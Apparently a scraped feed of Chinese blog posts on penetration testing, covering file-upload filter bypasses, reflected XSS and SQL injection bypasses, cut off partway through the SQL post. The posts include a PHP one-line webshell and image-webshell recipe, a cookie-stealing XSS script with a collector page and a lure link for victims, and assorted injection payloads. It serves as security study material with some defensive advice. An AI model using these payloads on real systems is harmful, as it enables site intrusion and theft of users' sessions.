    <link href="/2018/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2018/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-文件上传漏洞"><a href="#0x00-文件上传漏洞" class="headerlink" title="0x00 文件上传漏洞"></a>0x00 文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。上一篇文件上传漏洞的博客介绍了文件上传漏洞的原理和实战，这里来记录一些常见的绕过方法。</p><h2 id="0x01-绕过前端验证"><a href="#0x01-绕过前端验证" class="headerlink" title="0x01 绕过前端验证"></a>0x01 绕过前端验证</h2><p>我们都知道，任何基于前端的验证都是不安全的，因为用户能直接修改它进行绕过。</p><p>如果在前端对上传文件的格式进行了限制，我们可以通过以下的办法进行绕过:</p><ul><li><p>禁用js<br>我们通过firefox中的一个插件NoScript，将脚本禁用，这个时候上传文件的时候就不会触发js校验。</p></li><li><p>修改可上传的文件类型<br>因为是基于前端的验证，所有代码我们都可以通过firebug来修改，只需要在允许的类型中加入我们的文件类型，或者在禁止的类型中删除我们的文件类型，提交即可饶过。</p></li><li><p>通过BurpSuite绕过<br>我们通过BurpSuite进行绕过时，首先将文件名后缀改成它允许的类型，然后通过了前端的检查之后截取这个包，将文件后缀再改回来，就成功的绕过了js检查。</p></li></ul><h2 id="0x02-后端检测-MIME"><a href="#0x02-后端检测-MIME" class="headerlink" title="0x02 后端检测-MIME"></a>0x02 后端检测-MIME</h2><p>此类后端检查时，检查的是Content-Type，也叫Mime-Type，这个时候，我们上传一个PHP文件，通过BurpSuite抓包，将.php后缀的Content-Type: application/octet-stream更改为.jpg的Content-Type: image/jpeg。<br>然后发包，就可以绕过后端基于Content-Type的检测。</p><h2 id="0x03-后端检测-文件头"><a href="#0x03-后端检测-文件头" class="headerlink" title="0x03 后端检测-文件头"></a>0x03 后端检测-文件头</h2><p>这个时候他会检测文件的16进制数据头是否是合法文件的数据头，这个时候我们找一个普通的图片文件，再写一个一句话木马文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123456</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过前面隐写术的方法，进入两个文件的路径，在cmd中输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">copy</span>/b <span class="hljs-number">1</span>.jpg+<span class="hljs-number">1</span>.php <span class="hljs-number">2</span>.jpg <br></code></pre></td></tr></table></figure><p>制作成图片马，即可通过菜刀连接一句话木马。</p><h2 id="0x04-后端检测-黑名单"><a href="#0x04-后端检测-黑名单" class="headerlink" title="0x04 后端检测-黑名单"></a>0x04 后端检测-黑名单</h2><p>对于黑名单的检测方式，我们有如下几种办法绕过：</p><ul><li>后缀名大小写混用<br>假如.php后缀，我们可以写成.PHp之类的形式，用于一些过滤不严谨的系统。</li><li>双写后缀<br>在一些系统中，仅仅匹配非法后缀删除，这个时候我们构造.pphphp，当它将第一个php匹配删除之后，剩下的字符又重新组合成了.php。</li><li>同义后缀名<br>很多文件的后缀名不止一个，一些不常用的后缀名如果没有加入黑名单，就可以通过其他的同义后缀绕过。</li></ul><p>如下是几种常见的扩展名绕过：</p><p>Asp: asa  cer  cdx </p><p>Aspx: ashx  asmx ascx</p><p>Php:  php3 phtml</p><p>Jsp:   jspx  jspf</p><h2 id="0x05-后端检测-iis解析漏洞"><a href="#0x05-后端检测-iis解析漏洞" class="headerlink" title="0x05 后端检测-iis解析漏洞"></a>0x05 后端检测-iis解析漏洞</h2><p>在iis6中，如果提交图片格式为1.asp;.jpg，后缀是asp可以绕过检测，然后在上传后就会被解析成asp格式的文件，这个时候通过上面的办法制作图片马，然后上传后通过菜刀连接上传后的图片马即可。</p><h2 id="0x06-目录禁止执行"><a href="#0x06-目录禁止执行" class="headerlink" title="0x06 目录禁止执行"></a>0x06 目录禁止执行</h2><p>在一些存放上传文件的目录，禁止执行脚本，这个时候我们可以通过在这个目录创建新的子目录，然后将脚本写入子目录中，即可执行。</p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>文件上传漏洞带来的危害十分巨大，在有文件上传的位置，一定要做严格的检查，不能因为开发一时的方便而忽视危害，建议在开发时遵循如下几点：</p><ul><li>1.应用白名单的方式过滤文件扩展名</li><li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li><li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨站脚本攻击XSS</title>
    <link href="/2018/04/04/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
    <url>/2018/04/04/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。  </p><h2 id="0x01-XSS的原理"><a href="#0x01-XSS的原理" class="headerlink" title="0x01 XSS的原理"></a>0x01 XSS的原理</h2><p>XSS的原理其实也就是上面所说，恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。<br>HTML的script元素标记中间包含JavaScript，当浏览器遇到这一标记时，它不会将其内容处理成HTML或者XHTML，而是把对于其内容的控制权移交给另一个内置的浏览器代理——脚本处理引擎。又，Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码是否有害。  </p><h2 id="0x02-XSS的危害"><a href="#0x02-XSS的危害" class="headerlink" title="0x02 XSS的危害"></a>0x02 XSS的危害</h2><p>XSS在OWASP中一直占据着前十的地位，虽然表面上XSS不像sql注入、文件上传之类的漏洞一样直接可以获得很高的权限，但是因为xss漏洞广泛存在于各类网站之中，运用起来灵活多变，所以深受黑客偏爱。<br>它的常见危害有：</p><ul><li>（1）网络钓鱼，盗取各类用户的账号</li><li>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作</li><li>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等</li><li>（4）强制弹出广告页面，刷流量等</li><li>（5）传播木马</li></ul><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>首先我们要搭建漏洞环境，这里我们可以选用之前博客中提到的的LAMP环境，也可以搭建一个wamp环境，这里为了方便，我就在windows下搭建环境测试了，首先我们在wamp的www/xss文件夹下新建test.php,然后输入如下内容：  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xss_input&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php">setcookie(<span class="hljs-string">&#x27;cookie&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);</span><br><span class="php"><span class="hljs-variable">$xss</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss_input&#x27;</span>];</span><br><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your input is:&lt;br&gt;&#x27;</span>.<span class="hljs-variable">$xss</span>;</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后保存并打开wamp服务  </p><p>通过浏览器访问127.0.0.1/xss/test.php来访问刚才创建的页面,</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss01.jpg"></p><p>我们在输入框输入<script>alert('xss')</script>，点击提交，发现出现有如下图的xss的弹窗，此时环境搭建完成。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss02.jpg"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>如果只是控制弹窗，我们并不能直观的看到它的危害，下来我们尝试利用xss漏洞，看看能做到什么程度。<br>XSS最经常使用的就是获取Cookie了，攻击者通常利用网站的xss漏洞向页面写入窃取Cookie信息的代码，在用户浏览网页时，攻击者就会获取受害者当前浏览器中的Cookie信息。此时攻击者可以将Cookie信息向服务器提交，然后以受害者的身份登陆网站。<br>我们尝试一个最简单的反射型xss获取用户cookie。<br>我们先在自己的远程服务器上写一个php页面和一个js脚本来接收Cookie并保存：<br>hk.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;q&quot;</span>];<br><span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$log</span>, <span class="hljs-variable">$cookie</span> . <span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$log</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码的作用是读取q的值，然后以增加的方式打开cookie.txt，然后将读取到的值写入cookie.txt。</p><p>然后我们在漏洞页面构造如下xss：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-keyword">new</span> Image();x.src=<span class="hljs-string">&quot;http://127.0.0.1/xss/hk/hk.php?q=&quot;</span>+<span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们发现，cookie.txt中，已经有我们刚才页面的cookie了</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss03.jpg"></p><p>并且查看源代码，发现源代码中有这样一句javascript</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss04.png"></p><p>这个时候，如果把下面链接发送给别人，别人点到就可以获取它的cookie了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/xss/test.php?xss_input=%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Evar+x%<span class="hljs-number">3</span>Dnew+Image%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bx.src%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">2</span>Fxss%<span class="hljs-number">2</span>Fhk%<span class="hljs-number">2</span>Fhk.php%<span class="hljs-number">3</span>Fq%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Bdocument.cookie%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><p>虽然这样可以达成效果，但是我们发现，恶意代码都明明显显的写到url中了，很少会有人上当，而且url长度太长，遇到某些不能输入这么长js脚本的输入框怎么办？</p><p>所以就有了一个更好的解决办法，那就是将js脚本写到自己的服务器中，在搜索框中只需要调用咱们自己服务器上面的脚本就可以了。</p><p>我们在自己服务器中和刚才的hk.php同路径创建一个hk.js</p><p>hk.js:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">var <span class="hljs-attribute">x</span>=new Image();<br>x.<span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/xss/hk/hk.php?q=&quot;</span>+document.cookie;<br></code></pre></td></tr></table></figure><p>然后在漏洞界面写入如下xss：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;script src = http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/xss/</span>hk<span class="hljs-regexp">/hk.js&gt;&lt;/</span>script&gt;<br></code></pre></td></tr></table></figure><p>发现结果cookie.txt多了一行</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss05.jpg"></p><p>并且源码中的javascript如下</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xss/xss06.png"></p><p>然后我们构造一个链接来欺骗用户</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/xss/test.php?xss_input=%<span class="hljs-number">3</span>Cscript+src+%<span class="hljs-number">3</span>D+http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">2</span>Fxss%<span class="hljs-number">2</span>Fhk%<span class="hljs-number">2</span>Fhk.js%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><p>只要用户点击此链接，cookie就会被记录到我们服务器上的cookie.txt里面。</p><p>以上就是一次反射性xss最简单的利用方式。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>xss漏洞因为其危害不直观，往往不受到重视，但是它的运用十分灵活，绕过方式也和sql注入一样十分丰富，在有些时候可以达到意想不到的效果。<br>这次暂时就写到这里，下一篇关于xss的博客会详细的介绍xss的一些绕过检测和限制的方式，还有利用xss进行网络钓鱼以及网页挂马的方法。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入中的一些绕过方法</title>
    <link href="/2018/04/01/sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2018/04/01/sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-sql注入"><a href="#0x00-sql注入" class="headerlink" title="0x00 sql注入"></a>0x00 sql注入</h2><p>之前搭建sql注入环境测试过最基本的sql注入，但是实际情况中，会有很多的过滤来限制注入，这里记录读了《代码审计》和网络上搜集学习之后后掌握的几种常见的绕过方法，当作笔记。</p><h2 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01 大小写绕过"></a>0x01 大小写绕过</h2><p>mysql语句是不区分大小写的，如果过滤时没考虑到这点，就可以通过大小写混用来绕过。<br>如：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">UNion</span> <span class="hljs-built_in">SeLecT</span><br></code></pre></td></tr></table></figure><h2 id="0x02-宽字节注入"><a href="#0x02-宽字节注入" class="headerlink" title="0x02 宽字节注入"></a>0x02 宽字节注入</h2><p>程序在进行操作之前一般会进行一些编码处理，但是做编码处理的函数是有问题的，比如在使用php连接mysql时，如果设置“set character_set_client=gbk” 时，就会导致宽字节注入问题。<br>如提交1’ and 1=1’时，对引号的过滤会把提交的语句变为1&#39; and 1=1#’,这个时候，我们就没有把前面的引号闭合，无法使语句判别为真。<br>这个时候，我们如果提交1%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”，然后我们的语句就变成了1運’ and 1=1#’成功闭合了前面的引号。  </p><p>我们实战测试一下，在test.php中写入如下代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=gb2312&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-comment">// 创建连接</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect error: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-variable">$uid</span> = addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM user where id=<span class="hljs-subst">$uid</span>&quot;</span>;<br>mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;set names gbk&quot;</span>);<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br>print_r(<span class="hljs-string">&#x27;当前语句: &#x27;</span> .<span class="hljs-variable">$sql</span>. <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后传入参数进行测试</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg02.png"></p><h2 id="0x03-正则替换绕过"><a href="#0x03-正则替换绕过" class="headerlink" title="0x03 正则替换绕过"></a>0x03 正则替换绕过</h2><p>有的防注入机制会正则匹配危险关键字并用空白替换，这个时候可以写出类似：  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">UNunionION</span> SEL<span class="hljs-literal">select</span>ECT<br></code></pre></td></tr></table></figure><p>之类的用法，这个时候正则匹配一遍将union删除，剩下的部分又变成了UNION，就成功的绕过了。</p><h2 id="0x04-二次urldecode注入"><a href="#0x04-二次urldecode注入" class="headerlink" title="0x04 二次urldecode注入"></a>0x04 二次urldecode注入</h2><p>web程序进行参数过滤时，很多采用反斜杠来转义单引号等危险参数的方法。如果某处使用了urldecode或者rawurldecode函数，会导致二次解码生成单引号。<br>如我们提交的是/test.php?id=1%2527，因为没有提交单引号没有触发过滤，%25的解码结果是%。则第一次解码之后是/test.php?id=1%27，如果程序里面再次使用urldecode解码id参数的话，就会生成/test.php?id=1’，单引号成功闭合。  </p><p>我们们实战测试一下，在test.php中写入如下代码:  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-variable">$b</span>=urldecode(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$a=&#x27;</span>.<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b=&#x27;</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后传入参数进行测试，结果如下:</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg03.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg04.png"></p><h2 id="0x05-十六进制绕过"><a href="#0x05-十六进制绕过" class="headerlink" title="0x05 十六进制绕过"></a>0x05 十六进制绕过</h2><p>对于某些进行敏感词汇检查的机制，可以通过填ascii编码的十六进制来绕过，如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> from information_schema.tables where table_schema=<span class="hljs-number">0</span>x<span class="hljs-number">76657374</span><br></code></pre></td></tr></table></figure><p>其中0x76657374是test的十六进制表示</p><h2 id="0x06-空格绕过"><a href="#0x06-空格绕过" class="headerlink" title="0x06 空格绕过"></a>0x06 空格绕过</h2><p>在SQL注入时，空格的使用是非常普遍的，如果目标对空格进行了限制，这个时候有这几种绕过方法：<br>如我们原来要查询用户  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>  <br></code></pre></td></tr></table></figure><p>用注释替换空格：  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">select<span class="hljs-regexp">/**/u</span>sername<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/u</span>ser<br></code></pre></td></tr></table></figure><p>用回车（%0a）来替换空格</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>ausername<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>auser<br></code></pre></td></tr></table></figure><p>如果括号没有被过滤，那么能计算的一些式子也可以用括号来绕过<br>如</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select username() <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">1</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">2</span>=2<br></code></pre></td></tr></table></figure><p>可以写成</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">select</span>(<span class="hljs-title">username</span>())<span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-title">where</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)<span class="hljs-title">and</span>(<span class="hljs-number">2</span>=<span class="hljs-number">2</span>)</span><br></code></pre></td></tr></table></figure><p>虽然这句里面还有空格无法实现替换，但是在某些情况是一个非常实用的技巧。</p><h2 id="0x07-注释符绕过"><a href="#0x07-注释符绕过" class="headerlink" title="0x07 注释符绕过"></a>0x07 注释符绕过</h2><p>sql注入中可以用到的注释符是#或者–，如果目标没有过滤，在需要注释掉后面的引号等情况下十分好用。<br>如：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> union select * from <span class="hljs-keyword">user</span> <span class="hljs-title">--</span><br><span class="hljs-title">1</span>&#x27; <span class="hljs-keyword">and</span> &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="0x08-逗号绕过"><a href="#0x08-逗号绕过" class="headerlink" title="0x08 逗号绕过"></a>0x08 逗号绕过</h2><p>在某些WAF中对逗号进行了限制，或者一些通过逗号分隔post请求的环境，我们需要绕过逗号。<br>如我们要判断user第一个字符的ascii是否小于150，小于则返回1，否则返回0，我们知道从文本中提取字符应该用mid()函数，用法如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure><p>如果要实现上面所说功能本该这么构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> ascii(mid(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">150</span><br></code></pre></td></tr></table></figure><p>但是如果没了逗号，我们就得用from x for y的形式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> mid(user() from <span class="hljs-number">1</span> for <span class="hljs-number">1</span>)&lt;<span class="hljs-number">150</span><br></code></pre></td></tr></table></figure><p>再如有的时候，我们需要用limit函数来限制返回的数据数量，如我们要查询，从第三行开始的一行数据，limit之后的第一个数字代表行数（从0开始算）后面数字代表从这行要返回的行数<br>数据表如下：</p><p><img 